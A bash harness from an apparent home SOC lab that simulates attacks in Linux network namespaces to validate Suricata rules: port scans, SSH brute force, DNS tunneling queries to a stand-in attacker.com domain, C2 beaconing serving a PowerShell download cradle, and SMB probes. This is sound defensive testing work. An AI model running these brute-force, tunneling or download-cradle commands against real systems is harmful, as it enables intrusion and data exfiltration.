#!/usr/bin/env bash
# ---------------------------------------------------------------------------
# validate_rules_wsl.sh — reproducible detection-rule validation harness
#
# Runs the 5 attack scenarios from docs/attack_scenarios.md against a REAL
# 2-host network built from Linux network namespaces, captures real pcaps with
# tcpdump, then replays them offline through Suricata 8.x with the repo's
# rules/suricata/custom.rules.
#
# Why: the detection layer (Suricata rules) can be proven to work without the
# full pfSense/VLAN/SPAN/Windows lab. See evidence/host-validation/README.md
# for what this does and does NOT prove.
#
# Usage (Windows):  wsl.exe -d Ubuntu -u root -- bash scripts/validate_rules_wsl.sh
# Usage (Linux VM): sudo bash scripts/validate_rules_wsl.sh
#
# Requires: suricata, tcpdump, nmap, dig (dnsutils), curl, sshpass, openssh-server,
#           python3, iproute2, iptables (optional, for victim->external NAT)
# Installed on Ubuntu with:
#   apt-get install -y suricata tcpdump nmap dnsutils curl sshpass openssh-server
# ---------------------------------------------------------------------------
set -u

REPO="${REPO:-/mnt/c/Users/benha/home-soc-lab}"
OUT="$REPO/evidence/host-validation"
PCAP="$OUT/pcap"; LOG="$OUT/logs"; CFG="$OUT/config"
mkdir -p "$PCAP" "$LOG" "$CFG"

NETNS="socv"
ATK_IP="10.10.20.10"        # attacker (host namespace)  ~ VLAN20 analogue
TGT_IP="10.10.10.10"        # target  (netns "socv")     ~ VLAN10 analogue
EXT_IF="$(ip -4 -brief addr show eth0 2>/dev/null | awk '{print $3}' | cut -d/ -f1)"

echo "=== [1/6] build harness network (attacker host-ns <-> victim netns) ==="
ip netns del "$NETNS" 2>/dev/null
ip link del vhost 2>/dev/null
ip netns add "$NETNS"
ip link add vhost type veth peer name vtgt
ip link set vtgt netns "$NETNS"
ip addr add "$ATK_IP/24" dev vhost
ip link set vhost up
ip netns exec "$NETNS" ip link set lo up
ip netns exec "$NETNS" ip addr add "$TGT_IP/24" dev vtgt
ip netns exec "$NETNS" ip link set vtgt up
ip route replace 10.10.10.0/24 dev vhost
ip netns exec "$NETNS" ip route replace 10.10.20.0/24 dev vtgt
ip netns exec "$NETNS" ip route replace default via "$ATK_IP"
sysctl -qw net.ipv4.ip_forward=1
command -v iptables >/dev/null && {
  iptables -t nat -C POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE 2>/dev/null || \
  iptables -t nat -A POSTROUTING -s 10.10.10.0/24 -o eth0 -j MASQUERADE
}
ip netns exec "$NETNS" ip -brief addr

cap_start() { tcpdump -i vhost -U -n -w "$PCAP/$1.pcap" >/dev/null 2>&1 & TPID=$!; sleep 2; }
cap_stop()  { sleep 2; kill -INT "$TPID" 2>/dev/null; wait "$TPID" 2>/dev/null; }

# ---------------------------------------------------------------- Scenario 1
echo "=== [2/6] S1 port scan (nmap -sS -p 1-1000) ==="
cap_start s1-port-scan
nmap -sS -Pn -n -p 1-1000 "$TGT_IP" -T4 --max-retries 1 >"$LOG/s1-nmap-output.txt" 2>&1
cap_stop

# ---------------------------------------------------------------- Scenario 2
echo "=== [3/6] S2 SSH brute force (real sshd + real failed auths) ==="
ip netns exec "$NETNS" /usr/sbin/sshd -o PidFile=/tmp/sshd-socv.pid \
  -o ListenAddress="$TGT_IP" -o Port=22 -o PermitRootLogin=no 2>>"$LOG/sshd-start.log"
sleep 2
cap_start s2-ssh-brute
: > "$LOG/s2-ssh-attempts.txt"
for _ in $(seq 1 12); do
  sshpass -p 'WrongPass!' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -o PreferredAuthentications=password -o PubkeyAuthentication=no -o ConnectTimeout=3 \
    admin@"$TGT_IP" "id" >>"$LOG/s2-ssh-attempts.txt" 2>&1
done
cap_stop
grep -aE "Failed password|authentication failure|Invalid user" /var/log/auth.log 2>/dev/null \
  | tail -15 > "$LOG/s2-authlog-failures.txt"
kill "$(cat /tmp/sshd-socv.pid 2>/dev/null)" 2>/dev/null

# ---------------------------------------------------------------- Scenario 3
echo "=== [4/6] S3 DNS tunneling (32-char random labels to 8.8.8.8) ==="
cap_start s3-dns-tunneling
ip netns exec "$NETNS" bash -c 'for i in $(seq 1 14); do
  L=$(head -c16 /dev/urandom | od -An -tx1 | tr -d " \n")
  dig +notcp +time=1 +tries=1 +short "$L.data.tunnel.attacker.com" @8.8.8.8 >/dev/null 2>&1
done'
cap_stop

# ---------------------------------------------------------------- Scenario 4 + rule 6
echo "=== [5/6] S4 C2 beaconing + PowerShell cradle (HTTP from victim to external) ==="
python3 -m http.server 8080 --bind 0.0.0.0 >/dev/null 2>&1 &
HTTPPID=$!
python3 - >/dev/null 2>&1 <<'PY' &
import http.server, socketserver
class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        b=b"Invoke-WebRequest -Uri http://attacker.com/p.ps1 -OutFile p.ps1"
        self.send_response(200); self.send_header("Content-Length",str(len(b)))
        self.send_header("Content-Type","text/plain"); self.end_headers(); self.wfile.write(b)
    def log_message(self,*a): pass
socketserver.TCPServer.allow_reuse_address=True
socketserver.TCPServer(("0.0.0.0",8081),H).serve_forever()
PY
C2PID=$!
sleep 2
cap_start s4-c2-beaconing
ip netns exec "$NETNS" bash -c "for i in \$(seq 1 6); do
  curl -s -m 3 'http://$EXT_IF:8080/api/checkin?id=victim1' >/dev/null 2>&1
  curl -s -m 3 'http://$EXT_IF:8081/update.ps1' >/dev/null 2>&1
done"
cap_stop
kill $HTTPPID $C2PID 2>/dev/null

# ---------------------------------------------------------------- Scenario 5
echo "=== [6/6] S5 SMB lateral movement (SMB1 negotiate to victim :445) ==="
cat > /tmp/smb_stub.py <<'PY'
import socket
s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
s.bind(("0.0.0.0",445)); s.listen(5)
while True:
    c,a=s.accept(); c.recv(1024)
    c.sendall(bytes.fromhex("00000045ff534d42720000000018012800000000000000000000000000002f4b0000c155080000"))
    c.close()
PY
ip netns exec "$NETNS" python3 /tmp/smb_stub.py >/dev/null 2>&1 &
STUB=$!
sleep 2
cap_start s5-smb-lateral
python3 - <<'PY'
import socket, time
pkt=bytes.fromhex("00000054ff534d42720000000018012800000000000000000000000000002f4b0000c155080000")
for _ in range(3):
    try:
        t=socket.create_connection(("10.10.10.10",445),timeout=3); t.sendall(pkt); t.recv(256); t.close()
    except Exception as e: print("smb attempt err:",e)
    time.sleep(1)
PY
cap_stop
kill $STUB 2>/dev/null

# ---------------------------------------------------------------- Bonus rule 7
echo "=== bonus: S6 ICMP large payload (rule 1000007) ==="
cap_start s6-icmp-tunnel
ip netns exec "$NETNS" ping -c 5 -s 300 -W 2 8.8.8.8 >/dev/null 2>&1
cap_stop

# --------------------------------------------------- offline Suricata replay
echo "=== offline replay through Suricata with repo rules ==="
cp -f "$REPO/rules/suricata/custom.rules" "$CFG/custom.rules"
cat > "$CFG/validation.yaml" <<'YAML'
%YAML 1.1
---
vars:
  address-groups:
    HOME_NET: "[10.10.10.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
  port-groups:
    HTTP_PORTS: "[80,8080,8081]"
    SHELLCODE_PORTS: "!80"
    SSH_PORTS: "22"
    FILE_DATA_PORTS: "[$HTTP_PORTS]"
    FTP_PORTS: "21"
pcap-file:
  checksum-checks: no
default-log-dir: /tmp/suricata-log
outputs:
  - fast:
      enabled: yes
      filename: fast.log
      append: no
  - eve-log:
      enabled: yes
      filetype: regular
      filename: eve.json
      types: [alert, flow, dns, http, smb, ssh]
YAML
: > "$LOG/suricata-validation.txt"
for p in "$PCAP"/*.pcap; do
  n=$(basename "$p" .pcap)
  d="/tmp/so-$n"; rm -rf "$d"; mkdir -p "$d"
  echo "----- $n -----" >> "$LOG/suricata-validation.txt"
  suricata -r "$p" -c "$CFG/validation.yaml" -S "$CFG/custom.rules" -l "$d" \
    --runmode single -k none >>"$LOG/suricata-validation.txt" 2>&1
  [ -s "$d/fast.log" ] && cat "$d/fast.log" >> "$LOG/suricata-validation.txt" \
                       || echo "(no alert)" >> "$LOG/suricata-validation.txt"
  cp -f "$d/fast.log" "$LOG/$n.fast.log" 2>/dev/null
  cp -f "$d/eve.json" "$LOG/$n.eve.json" 2>/dev/null
done
echo
echo "=== ALERTS BY SID ==="
cat "$LOG"/*.fast.log 2>/dev/null | grep -oE '\[1:10000[0-9]+:[0-9]+\] [^[]*' | sort | uniq -c | sort -rn
echo "=== evidence in $OUT ==="
